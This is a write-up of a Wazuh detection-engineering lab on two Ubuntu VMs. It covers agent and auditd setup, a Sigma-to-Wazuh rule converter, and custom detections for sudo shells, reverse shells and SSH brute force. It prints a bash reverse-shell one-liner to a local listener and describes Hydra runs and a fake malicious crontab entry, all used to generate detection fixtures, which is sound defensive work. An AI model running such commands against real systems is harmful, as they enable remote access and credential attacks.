# SentryForge (Wazuh Edition) — Project Explanation

A detection engineering lab built on two Ubuntu 24.04 VMware VMs:
- **ubuntu-wazuh** (soumya2) — Wazuh manager, all-in-one (manager + indexer + dashboard)
- **monitored** (soumya3) — the endpoint being watched, running the Wazuh agent + auditd

This document explains what was actually done in each phase, point by point, in plain language.

---

## Phase 1 — Environment Setup

**Goal:** Make sure both VMs have enough resources and can talk to each other, before installing anything.

- Checked OS version on both VMs → confirmed Ubuntu 24.04.5 LTS on both.
- Checked RAM, disk, and CPU count on both VMs using `free -h`, `df -h`, `nproc`.
- Initial RAM split was 5.7 GB (ubuntu-wazuh) / 3.8 GB (monitored) — close to the guide's "tighter fallback" split, but not the recommended one.
- Reallocated RAM via VMware settings (shut down VMs, adjusted memory) since the monitored VM had far more RAM than it actually needs (an agent uses well under 512 MB).
- Final split: **7.7 GB (ubuntu-wazuh) / 1.8 GB (monitored)** — matches the guide's recommended 8 GB / 2 GB split.
- Confirmed both VMs are on the same VMware NAT network and can ping each other with low latency (sub-2ms), no packet loss.
- **Result:** Environment is correctly sized and networked. No blockers.

---

## Phase 2 — Wazuh Manager Installation (on ubuntu-wazuh)

**Goal:** Install Wazuh 4.14.x (manager + indexer + dashboard) and make sure everything is actually reachable and responding.

- Ran the official Wazuh all-in-one install script (`wazuh-install.sh -a`), which installs and configures the indexer, manager, and dashboard together, and generates admin credentials.
- Verified all three core services were `active (running)`:
  - `wazuh-indexer` (the OpenSearch-based storage/search engine)
  - `wazuh-manager` (the actual Wazuh brain — analysisd, remoted, etc.)
  - `wazuh-dashboard` (the web UI)
- Verified the indexer responds directly on port 9200 (returned cluster info, confirming it's healthy).
- Hit a snag testing the REST API (port 55000): used the wrong password (`admin`'s password instead of `wazuh-wui`'s — Wazuh generates a **separate password per internal user**, not one shared password).
  - Fixed by extracting `wazuh-install-files.tar` and reading `wazuh-passwords.txt`, which lists every internal username with its own password.
  - Retried with the correct `wazuh-wui` password → got back a valid JWT token, confirming the API works.
- Logged into the dashboard from the Windows host browser (`https://<ubuntu-wazuh-IP>`) using the `admin` credentials — confirmed login works.
- **Set a 7–14 day retention policy** on the indexer using Index State Management (ISM), because the default behavior is to keep data indefinitely, which would eventually fill the disk and cause OpenSearch to go into a read-only "flood-stage" state. Applied a policy that auto-deletes `wazuh-alerts-*` indices older than 14 days.
- **Result:** Wazuh manager fully installed, verified, and configured for long-term disk safety.

---

## Phase 3 — Endpoint Telemetry (on monitored)

**Goal:** Get the Wazuh agent and auditd running on the monitored machine, and prove that real security-relevant events actually reach the dashboard, correctly decoded.

### Agent installation
- Installed the Wazuh agent on monitored using the dashboard's "Deploy agent" wizard (which generates a `.deb` install command pointing the agent at the manager's IP).
- Enabled and started the `wazuh-agent` service — confirmed all five internal processes running (execd, agentd, syscheckd, logcollector, modulesd).
- Confirmed in the Wazuh dashboard that the agent (`soumya-3`) shows as **active**.

### auditd installation and cleanup
- Installed `auditd` and `audispd-plugins`.
- Pulled the **Neo23x0** community audit ruleset (a well-regarded, comprehensive set of Linux syscall watch rules) and loaded it via `augenrules --load`.
- Hit **three separate categories of load errors**, all diagnosed and fixed one at a time (full detail will be in `errors_fix.md`):
  1. Rules referencing 32-bit syscall support (`arch=b32`) — this kernel is 64-bit only, so those specific lines were harmless but rejected. Removed them, kept the working `arch=b64` equivalents.
  2. Rules referencing SELinux labels (`subj_type=crond_t`) — this system uses AppArmor, not SELinux, so these rules loaded without error but silently failed at the kernel level, spamming `dmesg`. Removed them.
  3. Rules watching directories/binaries for tools not installed on this system (LVM, Filebeat, CrowdStrike) — removed since they don't apply here.
- After cleanup: `augenrules --load` completed with **zero errors**, 150 active rules confirmed via `auditctl -l`, and `dmesg` confirmed clean.

### Getting auditd events into Wazuh
- Discovered that Wazuh doesn't automatically forward arbitrary log files — it only ships what's explicitly declared via a `<localfile>` block in `ossec.conf`.
- Added a `<localfile>` block pointing at `/var/log/audit/audit.log` with `log_format: audit`, and restarted the agent.
- Confirmed via `wazuh-logtest` that auditd events decode correctly into structured fields (`audit.type`, `audit.uid`, `audit.auid`, `audit.exe`, etc.) — this was the phase's **validation gate**.
- Investigated why these events weren't visible as alerts in the dashboard's "Threat Hunting" view: turned out raw auditd syscall events **do** reach the manager (confirmed via the raw archive log), but most don't match any *alerting* rule by default (they match a generic, non-alerting "grouping" rule, level 0) — this is expected, and exactly the gap the project's custom detection rules are meant to fill later.
- Also resolved a separate, unrelated confusion: after briefly stopping/restarting the agent, no data appeared for "today" at first — traced to Wazuh naming its daily indices by **UTC date** (not local IST time), combined with the agent genuinely having been switched off overnight. Not a bug — confirmed normal behavior.
- **Result:** Agent registered and active, auditd installed with a cleaned-up ruleset, and end-to-end pipeline (auditd → agent → manager → decoder) verified working with correctly parsed fields.

---

## Phase 4 — Manual Detection Proof-of-Concept + Converter Validation (on ubuntu-wazuh)

**Goal:** Hand-write one detection rule, build a first version of the Sigma-to-Wazuh converter, deploy it manually via the API, and prove it fires on real activity — all without any GitHub/CI automation yet (that comes later, in Phase 7).

### The detection
- Chose: *"Sudo used to spawn an interactive bash shell directly"* — a common privilege-escalation pattern, mapped to MITRE ATT&CK technique **T1548.003**.
- Wrote it as a constrained Sigma-style YAML rule, following the project's deliberate scope limit: **flat AND-only conditions** (no OR logic), since Wazuh's rule engine cannot natively express OR within one rule.

### The converter (v1)
- Built a Python script (`sigma_to_wazuh.py`) that:
  - Reads the constrained Sigma YAML.
  - Enforces the scope limits strictly (rejects anything with list values, unsupported fields, or a condition other than `selection`).
  - Assigns each rule a unique ID from Wazuh's reserved custom-rule range (100000–120000), tracked in a small JSON map file so IDs stay stable across reruns.
  - Outputs a Wazuh-native XML rule file, including native `<mitre>` tags extracted from the Sigma rule's `attack.*` tags.

### Testing and a real bug found + fixed
- First test attempt: the rule **did not fire** — instead, a built-in Wazuh rule (`5403`, a generic "first time sudo used" rule) fired instead.
- Diagnosed the real cause: Wazuh's built-in sudo rules are structured as **children** of a base rule (`5400`) using `<if_sid>`, not as standalone rules matching the decoder directly. Our rule was written as a standalone top-level rule, so it was competing with — and losing to — the built-in rule hierarchy.
- **Fixed by updating both the Sigma rule and the converter**: added support for a `parent_id` field in the Sigma YAML, which the converter now translates into `<if_sid>` in the Wazuh XML, correctly making our rule a sibling of Wazuh's own sudo rules rather than a competitor to the decoder itself.
- Re-tested with `wazuh-logtest`: confirmed the rule now fires correctly on the exact malicious pattern (`sudo` + `/bin/bash`) and correctly does **not** fire on an unrelated sudo session-open event (no false positive).

### Manual deployment
- Deployed the rule via the actual Wazuh REST API (not just by hand-copying the file), using `PUT /rules/files/{filename}` — noting the real-world gotcha that this endpoint requires `Content-Type: application/octet-stream`, not `application/json`.
- Restarted the manager via the API (`PUT /manager/restart`) to load the new rule into production.
- **Confirmed live, end-to-end**: triggered `sudo /bin/bash` on the monitored machine multiple times, and watched the custom rule (ID `100000`) fire for real in `alerts.log`, with the correct description, severity level, and MITRE tag — sourced from genuine endpoint activity, not a test harness.
- **Result:** Working proof-of-concept detection, a validated converter (with one real design bug found and fixed), and a fully manual but confirmed deploy pipeline — ready to be scaled up (more rules) and later automated (CI/CD) in subsequent phases.

---

## Phase 5 — Fixture Dataset Creation

**Goal:** Generate real benign + malicious log samples on the monitored machine for each of the four target attack techniques, and save the exact raw log lines as static files under `fixtures/`, so future automated testing (CI, later phases) never needs to touch the monitored machine again.

### Getting the extraction method right (an important early correction)
- Initially generated an activity, then manually copy-pasted the resulting `journalctl` output from chat back into a `cat > file` command on the manager — this was flagged as **not truly scripted** (fragile, not reproducible, not something CI could ever do).
- Corrected approach considered: `scp`/SSH the files from monitored to the manager — but this was also unnecessary and got corrected further.
- **Final, correct approach:** since the Wazuh agent already forwards every event to the manager, the exact raw log lines are already sitting locally on the manager itself — in `alerts.log` for anything that generated an alert, or in `archives.log` (with `<logall>` temporarily enabled) for raw events that don't alert by default. All fixture extraction was done as a single `grep` command redirected straight into the fixture file — genuinely scripted, zero manual retyping, zero unnecessary cross-VM copying.

### Technique 1 — T1548.003 (sudo → bash)
- Reused the real events already captured and confirmed back in Phase 4.
- Extracted directly from `alerts.log`: one malicious line (`sudo` executing `/bin/bash` directly) and one benign line (a normal sudo session open with no direct bash execution).

### Technique 2 — T1110 (SSH brute force)
- Confirmed sshd's effective config actually allows password authentication (`sudo sshd -T`), since it's not always obvious from the config files alone.
- Created a disposable, low-privilege test account solely for this exercise.
- Ran Hydra locally against `127.0.0.1` with a small wordlist (three wrong passwords, one correct), throttled to one attempt every 2 seconds to avoid hammering the small VM.
- Captured a second, separate clean single-attempt login (no prior failures) as the benign counterpart, to give later detection rules something to contrast against.
- Extracted both from `alerts.log` (Wazuh's default ruleset already alerts on SSH auth failures/successes) by matching on each event's unique process ID (PID).
- Cleaned up: removed the disposable test account and the password wordlist file afterward.

### Technique 3 — T1059.004 (reverse shell)
- This technique is different: raw auditd `execve`/`connect` syscall records don't generate alerts by default (they only match a generic, non-alerting rule), so `alerts.log` alone wasn't enough — needed `archives.log` instead, which meant temporarily re-enabling `<logall>` again (same mechanism used back in Phase 3).
- **Hit a real infrastructure issue along the way:** re-enabling `<logall>` and restarting the manager caused `wazuh-manager.service` to hang and eventually fail with a systemd timeout — the old processes never fully stopped before new ones tried to start, doubling up and eventually getting killed. Diagnosed via `journalctl -xeu wazuh-manager.service`, which showed processes reported as "already running" during what should have been a clean restart.
  - **Fixed** by forcing a full stop with Wazuh's own control script (`wazuh-control stop`), confirming no wazuh processes remained (`ps aux | grep wazuh`), then starting cleanly with `wazuh-control start` instead of relying on `systemctl restart`.
- Started a local `nc` listener on the monitored machine, then triggered a classic bash reverse-shell one-liner (`bash -c 'bash -i >& /dev/tcp/127.0.0.1/4444 0>&1'`) connecting back to that listener — captured a real `execve` → `socket` → `connect` → `bash -i` sequence, all tied together by the same audit session ID.
- Learned that audit session IDs (`ses=`) can be **recycled** by the kernel over time, so an early extraction attempt using `ses=50` accidentally pulled in an unrelated, older event that happened to reuse the same session number. Corrected by extracting on the exact audit timestamp-second instead, which is unique to the actual malicious burst.
- For the benign counterpart, first tried a plain `echo` command — this produced **zero** auditd records, because `echo` is a bash builtin, not an external program, so it never triggers an `execve` syscall at all (auditd only sees real process creation). Switched to a genuine external command (`/bin/cat /etc/hostname`) instead, which correctly generated a capturable event.

### Technique 4 — T1053.003 (cron persistence)
- This technique **is** covered by Wazuh's default alerting ruleset out of the box (rules `2833` for root's crontab changing, `2832` for a regular user's), so extraction went straight through `alerts.log`, no `<logall>` needed.
- Added a suspicious entry to **root's** crontab (a fake reverse-shell-style curl-to-bash line) as the malicious case, and a routine entry to a **normal user's own** crontab (a harmless `updatedb` scheduled job) as the benign case — both done non-interactively via `crontab -l | ... | crontab -` rather than opening an editor.
- Confirmed both fired as expected: `2833` (level 8) for the root case, `2832` (level 5) for the regular-user case.
- Cleaned up both crontabs immediately afterward with `crontab -r`, so no live (fake) malicious cron job was left running.

### Result
- **8 fixture files** created (4 techniques × malicious + benign each), all genuinely extracted from real, live pipeline activity — nothing hand-typed.
- Reverted `<logall>`/`<logall_json>` back to `no` afterward, and restarted the manager cleanly using `wazuh-control restart` (learned from the earlier hang) to avoid re-triggering the same restart issue.

---

## Phase 6 — Writing the Remaining Detection Rules

**Goal:** Using the same process as Phase 4 (write Sigma rule → convert → test against real fixtures → deploy via API → confirm live), build detections for the remaining techniques — and be honest about which ones are actually achievable, rather than padding the rule count for its own sake.

### Detection 2 — T1059.004 (Reverse Shell)
- Before writing anything, fed the real `connect` syscall line from our Phase 5 fixture into `wazuh-logtest` to confirm the exact decoded field names — found `audit.exe` and `audit.syscall` (the raw numeric syscall ID; `42` = `connect` on x86_64).
- Found the built-in auditd base rule (`80700`) the same way we found `5400` for sudo in Phase 4 — same hierarchy pattern, applied the lesson immediately this time instead of rediscovering it.
- **Extended the converter**: auditd's decoded fields keep a dotted prefix (`audit.exe`, not just `exe`), which the existing `data.<field>` convention couldn't express. Added a new `field.<literal_name>` selector to the Sigma schema and converter, for cases needing an exact Wazuh field name rather than a `data.`-stripped one.
- Wrote the rule matching **both** `audit.exe = /usr/bin/bash` **and** `audit.syscall = 42` together — deliberately not just `exe=bash` alone, since plain bash usage is extremely common and would cause false positives if the syscall condition were dropped.
- Tested against three real fixture lines: the actual malicious `connect` event (fired correctly), a benign `cat` execve (correctly didn't match), and — the more important negative test — a plain `bash` **execve** (not a connect) from the very same attack session, proving the two-field AND condition genuinely discriminates rather than just matching on "any bash activity."
- Deployed and confirmed live: triggering a real reverse shell on the monitored machine fired the custom rule end-to-end.

### Detection 3 — T1053.003 (Cron Persistence) — investigated, deliberately not implemented
- The original plan was a more specific detection: a crontab entry containing a network/download tool (e.g. `curl | bash`), rather than the default ruleset's blanket "any crontab change" alert.
- **Checked first** whether this was even achievable: fed the real crontab-change syslog line into `wazuh-logtest` and got `No decoder matched` — confirming the syslog announcement (`crontab[PID]: (root) REPLACE (root)`) never contains the actual entry content, only the fact that a replace happened.
- Investigated a genuine alternative: Wazuh's File Integrity Monitoring (FIM) can capture literal file diffs with `report_changes="yes"`, which would contain the real cron entry text. Enabled FIM on the crontab spool directory and tested.
- **Found a real, structural limitation**: `crontab` doesn't edit its file in place — it writes a new file and atomically renames it, which FIM logs as a delete-then-add pair, not a modify. Diff capture only works on genuine modifies, so this approach cannot work for this specific file, confirmed by checking the alert JSON for a diff field (none present).
- **Decision:** rather than write a "custom" rule that only duplicates what the built-in rule `2833` already does (the only signal actually available at the syslog level), documented this as a deliberate non-implementation — a defensible engineering call, not a shortcut.
- Removed the FIM watch on the crontab directory afterward per the "don't leave test config in place" principle, and — at the person's request — repurposed FIM to instead watch `/home/soumya3` (their own home directory) with diff capture enabled, for their own future testing outside this project's scope.

### Detection 4 — T1110 (SSH Brute Force) — the most structurally different one
- A single log line can't represent "many failures then a success" — this needed Wazuh's native `frequency`/`timeframe` correlation (a rule that fires only once a sibling rule has matched N times within a time window), not a field match.
- Found Wazuh already ships a brute-force frequency rule (`5551`: 8 failures in 180 seconds), but testing our own fixture against it revealed a real, provable gap: `5551` is chained off the PAM-layer rule (`5503`), but our fixture showed the **sshd-layer** rule (`5760`) is actually the one that accumulates a `firedtimes` count per attempt — and Wazuh has no built-in frequency rule chained off `5760` at all.
- **Extended the converter again**, adding a `correlation` block to the Sigma schema (`if_matched_sid`, `frequency`, `timeframe`, `same_source_ip`), translated into Wazuh's native `frequency`/`timeframe` attributes on the `<rule>` tag plus an `<if_matched_sid>` child element.
- Hit and fixed a Python syntax bug in the first version of this converter patch (an f-string with an escaped quote inside its expression, invalid in this Python version) — fixed by extracting the dictionary lookups into plain variables first.
- Tuned the new rule to a fast, small-burst threshold (3 failures within 15 seconds) specifically to catch what `5551`'s slower 8-in-180 threshold would miss — proven directly: fed the real 3-failure fixture sequence into `wazuh-logtest` and watched it correctly escalate to the custom rule exactly on the third failure, with no premature firing on the first two.
- Deployed and confirmed live with a fresh real Hydra brute-force run against live sshd.

### Result
- **3 working custom detections deployed and live-validated**: T1548.003 (Phase 4), T1059.004, T1110.
- **1 technique (T1053.003) deliberately documented as not needing a custom rule**, backed by direct evidence (decoder test + FIM diff-capture investigation) rather than assumption.
- The converter now supports three distinct rule shapes: simple field-match rules (`data.<field>`), literal-named field-match rules (`field.<literal_name>`, for decoders like auditd), and frequency/timeframe correlation rules (`correlation` block) — a genuinely more capable tool than the Phase 4 version, extended only when a real, tested need justified it.

---

## What's next

- **Phase 7 onward:** Set up the actual GitHub repo, self-hosted CI runner, and the automated lint → convert → test → deploy pipeline.
